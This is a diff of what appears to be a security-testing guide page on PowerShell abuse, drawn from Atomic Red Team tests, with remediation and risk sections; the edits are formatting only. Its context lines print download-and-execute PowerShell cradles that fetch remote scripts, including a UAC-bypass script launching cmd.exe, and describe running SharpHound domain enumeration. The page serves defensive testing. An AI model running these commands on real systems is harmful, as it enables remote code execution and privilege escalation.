@@ -92,7 +92,7 @@ powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invo
 
 Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.
 
-Successful execution will produce stdout message stating "SharpHound Enumeration Completed". Upon completion, final output will be a *BloodHound.zip file.
+Successful execution will produce stdout message stating "SharpHound Enumeration Completed". Upon completion, final output will be a \*BloodHound.zip file.
 
 **Supported Platforms:** windows
 
@@ -104,13 +104,14 @@ Start-Sleep 5
 ```
 
 **Dependencies:**
+
 - SharpHound.ps1 must be located at "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
 
 ### Atomic Test 3: Run Bloodhound from Memory using Download Cradle
 
 Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.
 
-Successful execution will produce stdout message stating "SharpHound Enumeration Completed". Upon completion, final output will be a *BloodHound.zip file.
+Successful execution will produce stdout message stating "SharpHound Enumeration Completed". Upon completion, final output will be a \*BloodHound.zip file.
 
 **Supported Platforms:** windows
 
@@ -144,7 +145,6 @@ Bypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-pat
 Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
 ```
 
-
 ### Manual Testing
 
 If Atomic Red Team tests are not applicable, manually verify the technique by:
@@ -158,42 +158,44 @@ If Atomic Red Team tests are not applicable, manually verify the technique by:
 ## Remediation Guide
 
 ### M1042 Disable or Remove Feature or Program
+
 It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions.
 
 Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.
 
 ### M1049 Antivirus/Antimalware
+
 Anti-virus can be used to automatically quarantine suspicious files.
 
 ### M1045 Code Signing
+
 Set PowerShell execution policy to execute only signed scripts.
 
 ### M1026 Privileged Account Management
+
 When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.
 
 PowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions.
 
 ### M1038 Execution Prevention
-Use application control where appropriate. PowerShell Constrained Language mode can be used to restrict access to sensitive or otherwise dangerous language elements such as those used to execute arbitrary Windows APIs or files (e.g., `Add-Type`).
 
+Use application control where appropriate. PowerShell Constrained Language mode can be used to restrict access to sensitive or otherwise dangerous language elements such as those used to execute arbitrary Windows APIs or files (e.g., `Add-Type`).
 
 ## Detection
 
 ### Abuse of PowerShell for Arbitrary Execution
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| PowerShell technique applicable | Medium | Execution |
+| Finding                         | Severity | Impact    |
+| ------------------------------- | -------- | --------- |
+| PowerShell technique applicable | Medium   | Execution |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID | Title                                  |
+| ------ | -------------------------------------- |
 | CWE-94 | Improper Control of Generation of Code |
-
 
 ## References
 
